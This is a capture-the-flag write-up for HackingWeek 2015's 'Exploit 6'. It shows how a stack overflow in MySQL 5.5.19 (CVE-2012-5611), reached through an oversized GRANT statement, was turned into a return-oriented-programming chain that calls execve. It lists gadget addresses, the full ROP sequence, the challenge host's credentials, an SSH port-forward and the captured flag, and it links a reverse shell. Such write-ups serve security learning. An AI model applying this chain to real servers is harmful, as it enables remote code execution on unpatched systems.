# HackingWeek CTF 2015: Exploit 6

**Category:** exploit |
**Points:** 7224 |
**Solves:** 3 |
**Description:**

> Connectez-vous en tant que <code>guest</code> (mot de passe: <code>shu1eKoo</code>) sur la machine <code>37.187.22.21</code>.<br>
> Vous trouverez la clef de validation cach√©e dans le fichier <code>/home/exploit06/.secret</code>.
>
> ```
> $> ssh guest@37.187.22.21
> ```

___

## Write-up

This task is an exploit task.  
We are given a shell on a remote server.  
The source code is also given. It is MySQL version 5.5.19.  
This version is vulnerable to several CVE.
(like... [a lot](http://www.cvedetails.com/vulnerability-list.php?vendor_id=93&product_id=21801&version_id=120498).)

There are two interesting PoC by kingcope :
- [CVE-2012-5611](http://www.cvedetails.com/cve/CVE-2012-5611/)
- [CVE-2012-5612](http://www.cvedetails.com/cve/CVE-2012-5612/).

Everyone started working on the heap overflow, because the account we had did
not have GRANT rights.  
It seems to me that the heap overflow cannot be exploited.

Even though we did not have GRANT rights, it was possible to trigger a
segfault with a large string such as :
```SQL
GRANT ALL ON `AAA...`.* TO yolo`
```

The binary is in remote, with non-exec stack, so ret2libc will work,
but is not possible because of the limitations of this exploit : table names
are in UTF-8, which means you get an error when you send wrong UTF-8
characters. (system is at 0xb7ea8c30 which is not valid.)

However, there is still a way to pwn it : return-oriented programming.  
ROP, works just like ret2libc. In fact, I see it as an evolution of ret2libc
attacks : instead of jumping to functions, you jump to part of code before
the end of a function.

Let's take an example :
```C
int foo(int x)
{
	int y = x;

	y *= 1337;
	y += 32;
	
	return y;
}
```
This function obviously returns `y = 1337 * x + 32`.

It is possible for us to jump in the middle of the function, right before the y += 32 line. It will increase one of our register by 32, and return it.
This is what we call a gadget, and ROP is putting together several gadgets to "recode" a shellcode with already-existing instructions.
Note that it is also possible to find gadgets that were not intended by the programmer : you cannot write "saltwater" without writing "twat".

Finding every gadgets by hand would be REALLY long, that's why there are software to make this task quicker.
I used the excellent rp++ by 0vercl0k to get every gadgets.

> Trying to open 'mysql-5.5.19-linux2.6-i686/bin/mysqld'..
> Loading ELF information..
> FileFormat: Elf, Arch: Ia32
> Using the Nasm syntax..
>
> Wait a few seconds, rp++ is looking for gadgets..
> in PHDR
> 0 found.
>
> in LOAD
> 679776 found.
>
> A total of 679776 gadgets found.

There is a lot of gadgets, but unfortunately, most of them were useless,
because MySQL only allows UTF-8 table names.
It means that we either have to be EXTREMLY lucky, or simply drop every
gadgets where one of the address's byte & 0x80 != 0.  
I picked the later.

We tried to call the execve syscall, with a binary from /tmp.  
Let's call it "hax" to get an 8-letters path (2 * 32 bits)  
> Call a syscall : INT 0x80  
> eax = syscall number (Here 0x0B for execve)  
> ebx = 1st argument (here "/tmp/hax")  
> ecx = 2nd argument (here {"/bin/hax", NULL})  
> edx = 3rd argument (here {NULL})  

By cherry-picking gadgets, we found some interesting gadgets :
```ASM
0x08052960: ret  ;  (1 found)
0x082a1579: pop eax ; ret  ;  (1 found)
0x08442908: xchg eax, ebp ; ret  ;  (1 found)
0x087f052d: xchg eax, ebx ; ret  ;  (1 found)
0x084e3456: xchg eax, ecx ; ret  ;  (1 found)
0x08240d14: xchg eax, edi ; ret  ;  (1 found)
0x084e3062: xchg eax, edx ; ret  ;  (1 found)
0x08190c2a: mov dword [eax], edx ; pop ebp ; ret  ;  (1 found)
0x0838733a: add eax, 0x01 ; ret  ;  (1 found)
0x0838484f: int 0x80 ;  (1 found)
```

With those gadgets, we can do almost anything we want :
first, pop eax which will pop next stack's value to eax, then xchg with an
other register to load "any" value to a register.  
We also needed a gadget to write a value to an address, to store our
"/tmp/hax" string.

Our sequence is :
```
popeax,   "/tmp"
xchgedx,
popeax,   0x09103030, // write it to 0x09103030
writeeax, 0x09103034, // pops ebp

// Write /hax to 0x09103034
popeax,   "/hax"
xchgedx,
xchgebp,
writeeax, 0x0910303C,

// Write address of "/tmp/hax" to 0x0910303C
popeax,   0x09103030,
xchgedx,
xchgebp,
writeeax, 0x09103040,

/*
 x86 syscalls :
 eax = syscall # (0x0B == execve)
 ebx = param 1
 ecx = param 2
 edx = param 3
*/

popeax, 0x09103030,
xchgebx,            // ebx = "/tmp/hax"

popeax, 0x0910303C, 
xchgecx,            // ecx = {"/tmp/hax", NULL}

popeax, 0x09103040, // pointer to NULL
xchgedx,            // envp = {NULL}

xchgedi, // edi seems to be always 0. Who care if it's true ? It's a CTF !
// 0 + 11 * 1
addeax,
addeax,
addeax,
addeax,
addeax,
addeax,
addeax,
addeax,
addeax,
addeax,
addeax,

syscall
```

Once the exploit works, there are still a few things to settle, before being
able to get the flag :  
* port 3307 is filtered by a firewall.
  * Use SSH to forward a port :
  * ssh -L 54321:127.0.0.1:3342 guest@37.187.22.21
* What do we put in hax ?
  * What about a [reverse shell](shell.c) ? :)

> `whoami; cat ../../.secret`  
> exploit06  
> Ahpheod2ij

[Final exploit (PHP)](poc.php)  
**Flag**: Ahpheod2ij

PS: At first, we wanted to spawn a reverse shell, but heh, at least, it worked,
right ? :P 
